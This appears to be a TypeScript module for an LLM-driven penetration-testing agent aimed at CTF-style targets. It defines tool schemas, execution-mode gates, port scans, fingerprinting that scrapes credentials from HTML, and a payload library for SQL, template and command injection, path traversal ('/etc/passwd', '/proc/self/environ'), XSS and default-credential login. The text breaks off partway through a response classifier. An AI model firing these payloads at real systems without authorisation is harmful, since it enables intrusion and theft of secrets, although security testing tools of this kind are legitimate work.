import type OpenAI from "openai";
import { ValidationEngine, type ValidationTarget, type VulnerabilityType } from "../validation/validation-engine";
import { apiFuzzingEngine, type ParameterSchema } from "../api-fuzzer/fuzzing-engine";
import { fuzzingExecutor } from "../api-fuzzer/fuzzing-executor";
import { portScan, sslCheck, httpFingerprint, detectAuthenticationSurface } from "../external-recon";
import { createProtocolProbe } from "../validation/probes";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface ToolCallEvidence {
  toolName: string;
  arguments: Record<string, unknown>;
  resultSummary: string;
  vulnerable: boolean;
  confidence: number;
  verdict?: string;
  httpEvidence?: { request: string; response: string; timing: number };
  executionTimeMs: number;
  timestamp: string;
}

export interface ExploitToolContext {
  executionMode: "safe" | "simulation" | "live";
  organizationId?: string;
  evaluationId?: string;
  assetId: string;
  tenantId?: string;
}

// ---------------------------------------------------------------------------
// Execution mode gates
// ---------------------------------------------------------------------------

const TOOL_MODE_REQUIREMENTS: Record<string, string[]> = {
  validate_vulnerability: ["simulation", "live"],
  fuzz_endpoint: ["simulation", "live"],
  test_payloads: ["simulation", "live"],
  send_http_request: ["simulation", "live"],
  http_fingerprint: ["safe", "simulation", "live"],
  port_scan: ["safe", "simulation", "live"],
  check_ssl_tls: ["safe", "simulation", "live"],
  run_protocol_probe: ["safe", "simulation", "live"],
};

function isToolAllowed(toolName: string, mode: string, args?: Record<string, unknown>): { allowed: boolean; reason?: string } {
  const allowed = TOOL_MODE_REQUIREMENTS[toolName];
  if (!allowed || !allowed.includes(mode)) {
    return {
      allowed: false,
      reason: `Tool '${toolName}' requires ${TOOL_MODE_REQUIREMENTS[toolName]?.join(" or ")} mode. Current mode: ${mode}. Use passive tools (http_fingerprint, port_scan, check_ssl_tls) instead.`,
    };
  }
  // Credential probes need simulation+
  if (toolName === "run_protocol_probe" && args?.probe_type === "credential" && mode === "safe") {
    return {
      allowed: false,
      reason: "Credential probing requires simulation or live mode. Try dns or smtp probes instead (allowed in safe mode).",
    };
  }
  return { allowed: true };
}

// ---------------------------------------------------------------------------
// Tool definitions (OpenAI function calling format)
// ---------------------------------------------------------------------------

export const EXPLOIT_AGENT_TOOLS: OpenAI.ChatCompletionTool[] = [
  {
    type: "function",
    function: {
      name: "validate_vulnerability",
      description:
        "Test a specific endpoint parameter for a vulnerability type (SQLi, XSS, SSRF, command injection, path traversal, auth bypass). Sends real payloads and analyzes responses. Requires simulation or live mode.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string", description: "Full URL of the target endpoint" },
          method: { type: "string", enum: ["GET", "POST", "PUT", "DELETE", "PATCH"] },
          parameter_name: { type: "string", description: "Name of the parameter to test" },
          parameter_location: { type: "string", enum: ["url_param", "body_param", "header", "cookie", "path"] },
          vulnerability_types: {
            type: "array",
            items: { type: "string", enum: ["sqli", "xss", "auth_bypass", "command_injection", "path_traversal", "ssrf"] },
            description: "Which vulnerability types to test",
          },
          original_value: { type: "string", description: "Original parameter value for differential testing" },
        },
        required: ["url", "method", "parameter_name", "parameter_location", "vulnerability_types"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "fuzz_endpoint",
      description:
        "Fuzz an API endpoint parameter with smart payloads (type mutation, null injection, boundary values, encoding tricks, injection strings). Detects anomalous responses.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string", description: "Endpoint URL" },
          method: { type: "string", enum: ["GET", "POST", "PUT", "DELETE", "PATCH"] },
          parameter_name: { type: "string", description: "Parameter to fuzz" },
          parameter_type: { type: "string", enum: ["string", "integer", "number", "boolean", "array", "object"] },
          parameter_location: { type: "string", enum: ["path", "query", "header", "body"] },
          max_payloads: { type: "number", description: "Max payloads to send (default 10)" },
        },
        required: ["url", "method", "parameter_name", "parameter_type", "parameter_location"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "http_fingerprint",
      description:
        "Fingerprint a web target: server technology, frameworks, security headers, and authentication surface (login pages, admin panels, OAuth endpoints). Safe/passive operation.",
      parameters: {
        type: "object",
        properties: {
          target: { type: "string", description: "URL or hostname to fingerprint" },
          include_auth_surface: { type: "boolean", description: "Also detect login pages, admin panels, OAuth endpoints" },
        },
        required: ["target"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "port_scan",
      description:
        "TCP port scan to discover open services. Returns open ports with service identification and banners. Safe/passive operation.",
      parameters: {
        type: "object",
        properties: {
          host: { type: "string", description: "Target hostname or IP" },
          ports: { type: "array", items: { type: "number" }, description: "Specific ports to scan (omit for common ports)" },
        },
        required: ["host"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "check_ssl_tls",
      description:
        "Analyze SSL/TLS configuration: certificate validity, protocol versions, cipher suites, known weaknesses. Safe/passive operation.",
      parameters: {
        type: "object",
        properties: {
          host: { type: "string", description: "Target hostname" },
          port: { type: "number", description: "TLS port (default 443)" },
        },
        required: ["host"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "run_protocol_probe",
      description:
        "Run protocol-level probes: SMTP open relay testing, DNS misconfiguration checks, LDAP anonymous bind, or default credential testing on services.",
      parameters: {
        type: "object",
        properties: {
          host: { type: "string", description: "Target hostname or IP" },
          probe_type: { type: "string", enum: ["smtp", "dns", "ldap", "credential"] },
          service: { type: "string", enum: ["ssh", "ftp", "mysql", "postgresql", "redis", "mongodb", "telnet"], description: "Only needed for credential probe" },
          port: { type: "number", description: "Override default port" },
        },
        required: ["host", "probe_type"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "test_payloads",
      description:
        "Deterministic payload tester: fires ALL standard payloads for specified vulnerability categories against a parameter, then reports which payloads produced interesting responses (reflection, errors, flag-like content, status changes). Use this AFTER fingerprinting to automatically test an endpoint — much faster and more thorough than manual send_http_request calls. Requires simulation or live mode.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string", description: "Base URL of the endpoint (e.g., http://localhost:8080/greet/)" },
          parameter: { type: "string", description: "Parameter name to inject into (e.g., 'name', 'id', 'query')" },
          parameter_location: {
            type: "string",
            enum: ["query", "body_form", "body_json", "path"],
            description: "Where the parameter lives: query string, form-encoded body, JSON body, or URL path segment",
          },
          vuln_categories: {
            type: "array",
            items: { type: "string", enum: ["ssti", "sqli", "cmdi", "path_traversal", "idor", "xss", "auth_bypass"] },
            description: "Which payload categories to test",
          },
          method: { type: "string", enum: ["GET", "POST", "PUT", "DELETE", "PATCH"], description: "HTTP method (default GET)" },
          headers: { type: "object", additionalProperties: { type: "string" }, description: "Extra headers (e.g., auth cookies)" },
          baseline_value: { type: "string", description: "Normal parameter value for differential comparison" },
        },
        required: ["url", "parameter", "parameter_location", "vuln_categories"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "send_http_request",
      description:
        "Send an arbitrary HTTP request and receive the full response (status, headers, body up to 8KB). Use this AFTER detecting a vulnerability to exploit it — e.g., send a crafted SQL injection payload to extract data, read files via path traversal, or execute commands. Requires simulation or live mode.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string", description: "Full URL including query parameters" },
          method: { type: "string", enum: ["GET", "POST", "PUT", "DELETE", "PATCH"], description: "HTTP method (default GET)" },
          headers: {
            type: "object",
            additionalProperties: { type: "string" },
            description: "Custom request headers (e.g., {\"Content-Type\": \"application/json\"})",
          },
          body: { type: "string", description: "Request body (for POST/PUT/PATCH)" },
        },
        required: ["url"],
      },
    },
  },
];

// ---------------------------------------------------------------------------
// Tool executor
// ---------------------------------------------------------------------------

/** Truncate a string to maxLen characters for LLM context. */
function truncate(s: string, maxLen: number = 4000): string {
  return s.length > maxLen ? s.slice(0, maxLen) + "... [truncated]" : s;
}

export async function executeExploitTool(
  toolName: string,
  args: Record<string, unknown>,
  ctx: ExploitToolContext
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const start = Date.now();

  // Mode gate
  const gate = isToolAllowed(toolName, ctx.executionMode, args);
  if (!gate.allowed) {
    return {
      result: JSON.stringify({ blocked: true, reason: gate.reason }),
    };
  }

  try {
    switch (toolName) {
      case "validate_vulnerability":
        return await execValidateVulnerability(args, ctx, start);
      case "fuzz_endpoint":
        return await execFuzzEndpoint(args, ctx, start);
      case "http_fingerprint":
        return await execHttpFingerprint(args, start);
      case "port_scan":
        return await execPortScan(args, start);
      case "check_ssl_tls":
        return await execSslCheck(args, start);
      case "run_protocol_probe":
        return await execProtocolProbe(args, start);
      case "test_payloads":
        return await execTestPayloads(args, ctx, start);
      case "send_http_request":
        return await execSendHttpRequest(args, ctx, start);
      default:
        return { result: JSON.stringify({ error: `Unknown tool: ${toolName}` }) };
    }
  } catch (error: any) {
    return {
      result: JSON.stringify({ error: error.message || "Tool execution failed" }),
    };
  }
}

// ---------------------------------------------------------------------------
// Individual tool executors
// ---------------------------------------------------------------------------

async function execValidateVulnerability(
  args: Record<string, unknown>,
  ctx: ExploitToolContext,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const target: ValidationTarget = {
    url: String(args.url),
    method: String(args.method) as ValidationTarget["method"],
    parameterName: String(args.parameter_name),
    parameterLocation: String(args.parameter_location) as ValidationTarget["parameterLocation"],
    originalValue: args.original_value ? String(args.original_value) : undefined,
    vulnerabilityTypes: (args.vulnerability_types as string[])?.map((v) => v as VulnerabilityType),
  };

  const engine = new ValidationEngine({
    executionMode: ctx.executionMode,
    maxPayloadsPerTest: 8,
    timeoutMs: 15_000,
    captureEvidence: true,
    safeMode: ctx.executionMode === "safe",
    tenantId: ctx.tenantId || "default",
  });

  const result = await engine.validateTarget(target);
  const elapsed = Date.now() - start;

  const summary = {
    vulnerable: result.vulnerable,
    confidence: result.overallConfidence,
    verdict: result.overallVerdict,
    payloadsTested: result.totalPayloadsTested,
    successfulPayloads: result.successfulPayloads,
    vulnerabilities: result.vulnerabilities.map((v) => ({
      type: v.type,
      vulnerable: v.result.vulnerable,
      confidence: v.result.confidence,
      evidence: v.result.evidence?.slice(0, 4000),
    })),
    recommendations: result.recommendations.slice(0, 3),
    executionTimeMs: elapsed,
  };

  return {
    result: truncate(JSON.stringify(summary)),
    evidence: {
      toolName: "validate_vulnerability",
      arguments: args,
      resultSummary: `${result.overallVerdict} (confidence: ${result.overallConfidence}%, ${result.totalPayloadsTested} payloads tested)`,
      vulnerable: result.vulnerable,
      confidence: result.overallConfidence,
      verdict: result.overallVerdict,
      httpEvidence: result.evidence.length > 0
        ? { request: result.evidence[0]?.slice(0, 2000) || "", response: result.evidence[1]?.slice(0, 4000) || result.evidence[0]?.slice(0, 4000) || "", timing: elapsed }
        : undefined,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function execFuzzEndpoint(
  args: Record<string, unknown>,
  ctx: ExploitToolContext,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const maxPayloads = Math.min(Number(args.max_payloads) || 10, ctx.executionMode === "simulation" ? 10 : 25);

  const paramSchema: ParameterSchema = {
    name: String(args.parameter_name),
    type: String(args.parameter_type),
    in: String(args.parameter_location) as ParameterSchema["in"],
  };

  const testCases = apiFuzzingEngine
    .generatePayloadsForParameter(paramSchema)
    .slice(0, maxPayloads)
    .map((payload, i) => ({
      id: `fuzz-${i}`,
      endpointPath: String(args.url),
      method: String(args.method),
      parameter: paramSchema,
      payload,
      generatedAt: new Date(),
    }));

  const result = await fuzzingExecutor.executeTestCases(testCases, {
    targetBaseUrl: String(args.url).replace(/\/[^/]*$/, "") || String(args.url),
    concurrency: 2,
    timeoutMs: 10_000,
    delayBetweenRequests: 50,
    maxTestCases: maxPayloads,
  });

  const elapsed = Date.now() - start;
  const hasCritical = result.summary.criticalFindings > 0;

  const summary = {
    totalTested: result.completedTestCases,
    anomalies: result.anomalies.length,
    critical: result.summary.criticalFindings,
    high: result.summary.highFindings,
    medium: result.summary.mediumFindings,
    topAnomalies: result.anomalies.slice(0, 3).map((a) => ({
      type: a.anomalyType,
      severity: a.severity,
      details: a.anomalyDetails?.slice(0, 2000),
      statusCode: a.statusCode,
      responseBody: (a as any).responseBody?.slice(0, 4000),
    })),
    avgResponseTime: Math.round(result.summary.averageResponseTime),
  };

  return {
    result: truncate(JSON.stringify(summary)),
    evidence: {
      toolName: "fuzz_endpoint",
      arguments: args,
      resultSummary: `${result.anomalies.length} anomalies (${result.summary.criticalFindings} critical) from ${result.completedTestCases} payloads`,
      vulnerable: hasCritical || result.summary.highFindings > 0,
      confidence: hasCritical ? 80 : result.summary.highFindings > 0 ? 60 : 30,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function execHttpFingerprint(
  args: Record<string, unknown>,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const target = String(args.target);
  const fp = await httpFingerprint(target);
  const auth = args.include_auth_surface ? await detectAuthenticationSurface(target) : null;

  // ── Crawl homepage for links, forms, and credentials ──────────────
  let discoveredLinks: string[] = [];
  let discoveredForms: Array<{ action: string; method: string; inputs: string[] }> = [];
  let htmlHints: string[] = [];
  let pageTitle = "";
  try {
    const resp = await fetch(target, { signal: AbortSignal.timeout(8000), redirect: "follow" });
    const html = await resp.text();
    const baseUrl = new URL(target);

    // Extract page title
    const titleMatch = html.match(/<title[^>]*>([^<]*)<\/title>/i);
    if (titleMatch) pageTitle = titleMatch[1].trim();

    // Extract all href links
    const hrefMatches = Array.from(html.matchAll(/(?:href|action|src)\s*=\s*["']([^"'#]+)["']/gi));
    const linkSet = new Set<string>();
    for (const m of hrefMatches) {
      try {
        const url = new URL(m[1], baseUrl.origin);
        if (url.origin === baseUrl.origin && !url.pathname.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot)$/i)) {
          linkSet.add(url.pathname + url.search);
        }
      } catch { /* invalid URL */ }
    }
    discoveredLinks = Array.from(linkSet).slice(0, 30);

    // Extract forms with their inputs
    const formMatches = Array.from(html.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi));
    for (const fm of formMatches) {
      // Support both quoted and unquoted attribute values (e.g., name="solution" or name=solution)
      const actionMatch = fm[0].match(/action\s*=\s*(?:["']([^"']*)["']|(\S+?)[\s>])/i);
      const methodMatch = fm[0].match(/method\s*=\s*(?:["']([^"']*)["']|(\w+))/i);
      const inputMatches = Array.from(fm[1].matchAll(/(?:name|id)\s*=\s*(?:["']([^"']+)["']|(\w+))/gi));
      discoveredForms.push({
        action: actionMatch?.[1] || actionMatch?.[2] || "",
        method: (methodMatch?.[1] || methodMatch?.[2] || "GET").toUpperCase(),
        inputs: inputMatches.map(im => im[1] || im[2]).filter(Boolean),
      });
    }
    discoveredForms = discoveredForms.slice(0, 10);

    // Extract hints: HTML comments, visible credentials, hidden fields
    const commentMatches = Array.from(html.matchAll(/<!--([\s\S]*?)-->/g));
    for (const cm of commentMatches) {
      const comment = cm[1].trim();
      if (comment.length > 5 && comment.length < 200) htmlHints.push(`Comment: ${comment}`);
    }

    // Look for hardcoded credentials in HTML (common in CTFs)
    const credPatterns = [
      /(?:username|user|login)\s*[:=]\s*["']?(\w+)["']?.*?(?:password|pass|pwd)\s*[:=]\s*["']?(\w+)["']?/gi,
      /(?:password|pass|pwd)\s*[:=]\s*["']?(\w+)["']?/gi,
      /(?:api[_-]?key|token|secret)\s*[:=]\s*["']([^"']+)["']/gi,
      /\baccount\s*\(?(\w+)[:/](\w+)\)?/gi,  // "account (test:test)" or "account test/test"
      /\((\w+):(\w+)\)/g,  // "(user:pass)" pattern common in CTFs
    ];
    for (const pat of credPatterns) {
      const matches = Array.from(html.matchAll(pat));
      for (const m of matches) {
        htmlHints.push(`Possible credential: ${m[0].slice(0, 100)}`);
      }
    }
    // Extract API endpoints from inline JavaScript (fetch/axios/XMLHttpRequest calls)
    const jsApiPatterns = [
      /fetch\(\s*["'`]([^"'`]+)["'`]/gi,                    // fetch('/api/endpoint')
      /axios\.\w+\(\s*["'`]([^"'`]+)["'`]/gi,              // axios.post('/api/endpoint')
      /\$\.(?:ajax|get|post)\(\s*["'`]([^"'`]+)["'`]/gi,   // $.ajax('/api/endpoint')
      /\.open\(\s*["']\w+["'],\s*["']([^"']+)["']/gi,      // xhr.open("POST", "/api/endpoint")
      /url:\s*["'`]([^"'`]+)["'`]/gi,                       // { url: '/api/endpoint' }
    ];
    const jsEndpoints = new Set<string>();
    for (const pat of jsApiPatterns) {
      const apiMatches = Array.from(html.matchAll(pat));
      for (const m of apiMatches) {
        const ep = m[1];
        // Only keep relative paths and same-origin URLs
        if (ep.startsWith("/") && !ep.match(/\.(css|js|png|jpg|svg|ico)$/i)) {
          jsEndpoints.add(ep);
        } else {
          try {
            const url = new URL(ep, baseUrl.origin);
            if (url.origin === baseUrl.origin) jsEndpoints.add(url.pathname);
          } catch {}
        }
      }
    }
    // Add JS-discovered endpoints to discovered links
    for (const ep of Array.from(jsEndpoints)) {
      if (!linkSet.has(ep)) {
        discoveredLinks.push(ep);
        linkSet.add(ep);
      }
    }
    // Also extract POST method hints from JavaScript
    const postEndpoints = Array.from(html.matchAll(/fetch\(\s*["'`]([^"'`]+)["'`]\s*,\s*\{[^}]*method:\s*["']POST["']/gi));
    for (const m of postEndpoints) {
      const ep = m[1].startsWith("/") ? m[1] : `/${m[1]}`;
      htmlHints.push(`JS API: POST ${ep}`);
    }
    // Extract JSON body field names from fetch() calls for context
    const jsonBodyPatterns = Array.from(html.matchAll(/JSON\.stringify\(\s*\{([^}]+)\}/gi));
    for (const m of jsonBodyPatterns) {
      const fields = Array.from(m[1].matchAll(/(\w+)\s*:/g)).map(f => f[1]);
      if (fields.length > 0) htmlHints.push(`JSON fields: ${fields.join(", ")}`);
    }

    htmlHints = htmlHints.slice(0, 20);
  } catch { /* crawl failed, continue with basic fingerprint */ }

  const elapsed = Date.now() - start;
  const summary: Record<string, unknown> = {
    server: fp.server,
    technologies: fp.technologies,
    securityHeaders: fp.securityHeaders,
    statusCode: fp.statusCode,
    pageTitle,
    discoveredLinks,
    discoveredForms,
    htmlHints,
  };
  const unprotectedPanels = auth?.adminPanels?.filter((p) => !p.protected) ?? [];
  if (auth) {
    summary.authSurface = {
      loginPages: auth.loginPages,
      adminPanels: auth.adminPanels,
      oauthEndpoints: auth.oauthEndpoints,
      unprotectedPanels,
    };
  }

  // Store full JSON in resultSummary so the post-agent sweep can extract
  // discoveredLinks, discoveredForms, and htmlHints for multi-step attacks
  const resultJson = JSON.stringify(summary);

  return {
    result: truncate(resultJson, 6000),
    evidence: {
      toolName: "http_fingerprint",
      arguments: args,
      resultSummary: truncate(resultJson, 6000),
      vulnerable: unprotectedPanels.length > 0,
      confidence: 0,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function execPortScan(
  args: Record<string, unknown>,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const host = String(args.host);
  const ports = Array.isArray(args.ports) ? (args.ports as number[]) : undefined;
  const results = await portScan(host, ports);
  const elapsed = Date.now() - start;

  const openPorts = results.filter((r) => r.state === "open");
  const summary = {
    totalScanned: results.length,
    openPorts: openPorts.map((p) => ({
      port: p.port,
      service: p.service,
      banner: p.banner?.slice(0, 100),
    })),
  };

  return {
    result: truncate(JSON.stringify(summary)),
    evidence: {
      toolName: "port_scan",
      arguments: args,
      resultSummary: `${openPorts.length} open ports on ${host}`,
      vulnerable: false,
      confidence: 0,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function execSslCheck(
  args: Record<string, unknown>,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const host = String(args.host);
  const port = Number(args.port) || 443;
  const result = await sslCheck(host, port);
  const elapsed = Date.now() - start;

  const hasIssues =
    (result.vulnerabilities?.length ?? 0) > 0 ||
    (result.daysUntilExpiry != null && result.daysUntilExpiry < 30);

  return {
    result: truncate(JSON.stringify(result)),
    evidence: {
      toolName: "check_ssl_tls",
      arguments: args,
      resultSummary: `TLS ${result.protocol || "unknown"}, ${result.vulnerabilities?.length || 0} issues`,
      vulnerable: hasIssues,
      confidence: hasIssues ? 70 : 0,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function execProtocolProbe(
  args: Record<string, unknown>,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const host = String(args.host);
  const probeType = String(args.probe_type) as "smtp" | "dns" | "ldap" | "credential";
  const port = args.port ? Number(args.port) : undefined;

  const baseConfig = { host, port };
  let probeConfig: Record<string, unknown>;
  switch (probeType) {
    case "dns":
      probeConfig = { ...baseConfig, domain: host };
      break;
    case "credential":
      probeConfig = { ...baseConfig, service: args.service ? String(args.service) : "ssh" };
      break;
    default:
      probeConfig = baseConfig;
  }

  const probe = createProtocolProbe({
    type: probeType,
    config: probeConfig as any,
  });

  const result = await probe.probe();
  const elapsed = Date.now() - start;

  return {
    result: truncate(JSON.stringify(result)),
    evidence: {
      toolName: "run_protocol_probe",
      arguments: args,
      resultSummary: `${probeType} probe on ${host}: ${result.vulnerable ? "VULNERABLE" : "OK"}`,
      vulnerable: result.vulnerable || false,
      confidence: result.confidence || 0,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

// ---------------------------------------------------------------------------
// Deterministic payload library
// ---------------------------------------------------------------------------

const PAYLOAD_LIBRARY: Record<string, string[]> = {
  ssti: [
    "{{FLAG}}", "{{flag}}", "{{config}}", "{{config.FLAG}}", "{{config.flag}}",
    "{{request.environ.FLAG}}", "{{request.environ.flag}}", "{{settings.FLAG}}",
    "${FLAG}", "${flag}", "<%= ENV['FLAG'] %>", "#{FLAG}",
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').environ}}",
  ],
  sqli: [
    "' UNION SELECT flag FROM flags--",
    "' UNION ALL SELECT flag FROM flags--",
    "' UNION SELECT flag,flag FROM flags--",
    "' UNION SELECT flag,flag,flag FROM flags--",
    "' UNION SELECT flag,flag,flag,flag FROM flags--",
    "' UNION SELECT * FROM flags--",
    "' UnIoN SeLeCt flag FROM flags--",
    "' UNION/**/SELECT/**/flag/**/FROM/**/flags--",
    "1 UNION SELECT flag FROM flags--",
    "1' UNION SELECT flag FROM flags-- -",
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "1; SELECT flag FROM flags--",
    "' UNION SELECT secret FROM secrets--",
    "' UNION SELECT password FROM users--",
    "' UNION SELECT flag FROM flag--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
  ],
  cmdi: [
    ";cat /flag", ";cat /flag.txt", ";cat /app/flag", ";cat /app/flag.txt",
    "$(cat /flag)", "$(cat /flag.txt)", "`cat /flag`", "`cat /flag.txt`",
    "|cat /flag", "|cat /flag.txt", "&&cat /flag",
    ";env", "$(env)", "|env", ";printenv FLAG", "$(printenv FLAG)",
    ";ls /", "$(ls /)", ";ls /app",
    ";id", "$(id)",
  ],
  path_traversal: [
    "../../flag", "../../flag.txt", "../../../flag", "../../../flag.txt",
    "../../etc/flag", "/etc/flag", "/flag", "/flag.txt",
    "/app/flag", "/app/flag.txt",
    "....//....//flag", "..%2f..%2fflag", "%2e%2e%2f%2e%2e%2fflag",
    "../../etc/passwd",
    "/proc/self/environ",
    // Null-byte / poison-null-byte bypasses (Juice Shop style)
    "../../etc/passwd%2500.md", "../../etc/passwd%2500.txt", "../../etc/passwd%00.md",
    "eastere.gg%2500.md", "package.json%2500.md", "server.js%2500.md",
    "....//....//etc/passwd%2500.md",
  ],
  idor: [
    "1", "2", "0", "admin", "100", "999", "300198",
  ],
  xss: [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{constructor.constructor('return this')()}}",
  ],
  auth_bypass: [
    "admin", "administrator", "root", "test",
    "admin:admin", "admin:password", "test:test", "root:root",
    "' OR 1=1--",
    "true", "1", // boolean/numeric bypass
  ],
  header_injection: [
    "1", "2", "admin", "10052", "0",
  ],
};

interface PayloadHit {
  payload: string;
  category: string;
  statusCode: number;
  bodyLength: number;
  interesting: string; // reason it's flagged
  responseSnippet: string;
}

async function execTestPayloads(
  args: Record<string, unknown>,
  ctx: ExploitToolContext,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const baseUrl = String(args.url);
  const parameter = String(args.parameter);
  const paramLocation = String(args.parameter_location || "query");
  const categories = (args.vuln_categories as string[]) || ["ssti"];
  const method = String(args.method || "GET").toUpperCase();
  const extraHeaders = (args.headers as Record<string, string>) || {};
  const baselineValue = args.baseline_value ? String(args.baseline_value) : "test123";

  const hits: PayloadHit[] = [];
  let totalTested = 0;
  let baselineStatus = 0;
  let baselineLength = 0;
  const deadline = Date.now() + 25_000; // 25s budget

  // Fetch baseline response for differential comparison
  try {
    const baseResp = await firePayload(baseUrl, parameter, paramLocation, baselineValue, method, extraHeaders);
    baselineStatus = baseResp.status;
    baselineLength = baseResp.body.length;
  } catch { /* baseline failed, still continue */ }

  // Fire payloads for each category
  for (const cat of categories) {
    const payloads = PAYLOAD_LIBRARY[cat] || [];
    for (const payload of payloads) {
      if (Date.now() > deadline) break;
      totalTested++;
      try {
        const resp = await firePayload(baseUrl, parameter, paramLocation, payload, method, extraHeaders);
        const interesting = classifyResponse(resp.body, resp.status, baselineStatus, baselineLength, payload, cat);
        if (interesting) {
          hits.push({
            payload,
            category: cat,
            statusCode: resp.status,
            bodyLength: resp.body.length,
            interesting,
            responseSnippet: resp.body.slice(0, 500),
          });
        }
      } catch { /* network error, skip */ }
    }
  }

  const elapsed = Date.now() - start;
  const summary = {
    totalTested,
    hits: hits.length,
    categories: categories.join(", "),
    baselineStatus,
    baselineBodyLength: baselineLength,
    results: hits.slice(0, 20).map(h => ({
      payload: h.payload,
      category: h.category,
      status: h.statusCode,
      interesting: h.interesting,
      response: h.responseSnippet.slice(0, 300),
    })),
  };

  const resultSummary = hits.length > 0
    ? `test_payloads: ${hits.length}/${totalTested} hits on ${parameter}. Top: ${hits.slice(0, 5).map(h => `[${h.category}] "${h.payload}" → ${h.interesting}`).join("; ")}`
    : `test_payloads: 0/${totalTested} hits on ${parameter} (${categories.join(",")})`;

  return {
    result: truncate(JSON.stringify(summary, null, 2), 8000),
    evidence: {
      toolName: "test_payloads",
      arguments: { url: baseUrl, parameter, vuln_categories: categories },
      resultSummary: `${resultSummary}\n${hits.slice(0, 10).map(h => `${h.payload} → ${h.statusCode} ${h.responseSnippet.slice(0, 200)}`).join("\n")}`,
      vulnerable: hits.length > 0,
      confidence: hits.length > 0 ? Math.min(hits.length * 20, 95) : 0,
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}

async function firePayload(
  baseUrl: string,
  parameter: string,
  paramLocation: string,
  payload: string,
  method: string,
  extraHeaders: Record<string, string>
): Promise<{ status: number; body: string }> {
  let url = baseUrl;
  let body: string | undefined;
  const headers = { ...extraHeaders };

  switch (paramLocation) {
    case "query": {
      const u = new URL(baseUrl);
      u.searchParams.set(parameter, payload);
      url = u.toString();
      break;
    }
    case "body_form": {
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = `${encodeURIComponent(parameter)}=${encodeURIComponent(payload)}`;
      break;
    }
    case "body_json": {
      headers["Content-Type"] = "application/json";
      body = JSON.stringify({ [parameter]: payload });
      break;
    }
    case "path": {
      // Replace last path segment or append — preserve pre-encoded sequences like %25, %00
      url = baseUrl.replace(/\/$/, "") + "/" + payload;
      break;
    }
  }

  const resp = await fetch(url, {
    method: method !== "GET" || (paramLocation === "body_form" || paramLocation === "body_json") ? (method === "GET" ? "POST" : method) : method,
    headers,
    body: body && method !== "GET" ? body : body, // Send body even on GET for body params
    signal: AbortSignal.timeout(5000),
    redirect: "follow",
  });

  const text = await resp.text();
  return { status: resp.status, body: text.slice(0, 8000) };
}

function classifyResponse(
  body: string,
  status: number,
  baselineStatus: number,
  baselineLength: number,
  payload: string,
  category: string
): string | null {
  const lower = body.toLowerCase();

  // Direct flag detection (highest priority)
  if (/flag\{[a-f0-9]+\}/i.test(body)) return "FLAG_FOUND";
  if (/flag\{/i.test(body)) return "FLAG_PATTERN";

  // SSTI: check for template evaluation
  if (category === "ssti") {
    if (payload === "{{7*7}}" && body.includes("49")) return "SSTI_CONFIRMED_49";
    if (payload === "${7*7}" && body.includes("49")) return "SSTI_CONFIRMED_49";
    if (payload === "<%= 7*7 %>" && body.includes("49")) return "SSTI_CONFIRMED_49";
    if (payload === "#{7*7}" && body.includes("49")) return "SSTI_CONFIRMED_49";
    // Check for environ/config dump
    if (lower.includes("environ") && body.length > baselineLength + 100) return "ENVIRON_DUMP";
    if (lower.includes("secret_key") || lower.includes("database_url")) return "CONFIG_LEAK";
    // Reflection of SSTI payload raw means no SSTI (not vulnerable)
    if (payload.startsWith("{{") && body.includes(payload)) return null;
  }

  // SQLi: check for SQL errors or data extraction
  if (category === "sqli") {
    if (lower.includes("sql") && (lower.includes("error") || lower.includes("syntax"))) return "SQL_ERROR";
    if (lower.includes("sqlite") || lower.includes("mysql") || lower.includes("postgresql")) return "DB_ERROR_LEAK";
    // Status change from baseline = potential SQLi behavior change
    if (status !== baselineStatus && status < 500) return "STATUS_CHANGE";
    // Body length significantly different
    if (Math.abs(body.length - baselineLength) > 200 && status < 500) return "BODY_LENGTH_CHANGE";
  }

  // Command injection: check for command output
  if (category === "cmdi") {
    if (lower.includes("root:") && lower.includes("/bin/")) return "PASSWD_LEAK";
    if (lower.includes("uid=") && lower.includes("gid=")) return "ID_OUTPUT";
    if (/\bflag=/i.test(body)) return "ENV_FLAG_VAR";
    // Check for directory listing output
    if (payload.includes("ls") && (body.includes("bin") || body.includes("etc") || body.includes("app"))) return "DIR_LISTING";
  }

  // Path traversal: check for file content
  if (category === "path_traversal") {
